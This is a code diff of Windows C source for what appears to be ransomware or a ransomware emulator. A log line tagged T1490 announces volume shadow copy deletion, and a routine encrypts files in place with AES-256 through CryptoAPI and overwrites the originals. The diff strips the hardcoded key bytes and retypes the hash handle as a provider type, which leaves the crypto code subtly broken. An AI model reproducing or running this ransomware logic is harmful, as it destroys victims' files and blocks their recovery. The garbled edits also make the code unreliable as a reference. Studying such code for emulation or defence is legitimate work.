@@ -39,15 +39,6 @@ static void AppendToFile(LPCWSTR path, LPCSTR text) {
     CloseHandle(hFile);
 }
 
-static void EnsureDirectory(LPCWSTR path) {
-    wchar_t tmp[MAX_PATH];
-    lstrcpyW(tmp, path);
-    for (int i = 0; tmp[i]; i++) {
-        if (tmp[i] == L'\\') { tmp[i] = L'\0'; CreateDirectoryW(tmp, NULL); tmp[i] = L'\\'; }
-    }
-    CreateDirectoryW(tmp, NULL);
-}
-
 static void DoVssadmin(void) {
     LogMessage(L"[*] T1490: Deleting volume shadow copies");
     STARTUPINFOW si = { sizeof(si) };
@@ -114,14 +105,11 @@ static void DoEncryptFiles(void) {
             ReadFile(hEncFile, buf, fileSize, &read, NULL);
             SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);
 
-            HCRYPTPROV hProv = 0;
-            HCRYPTHASH hHash = 0;
+HCRYPTPROV hProv = 0;
+            HCRYPTPROV hHash = 0;
             HCRYPTKEY hKey = 0;
-            BOOL ok = FALSE;
             if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                 if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-                    BYTE keyBytes[] = { 0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
-                                        0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF,0xFE,0xDC,0xBA,0x98,0x76,0x54,0x32,0x10 };
                     if (CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
                         CryptDestroyHash(hHash); hHash = 0;
                         DWORD encSize = fileSize + 64;
@@ -133,7 +121,6 @@ static void DoEncryptFiles(void) {
                                 SetEndOfFile(hEncFile);
                                 DWORD written = 0;
                                 WriteFile(hEncFile, encBuf, fileSize, &written, NULL);
-                                ok = TRUE;
                                 encrypted++;
                             }
                             LocalFree(encBuf);
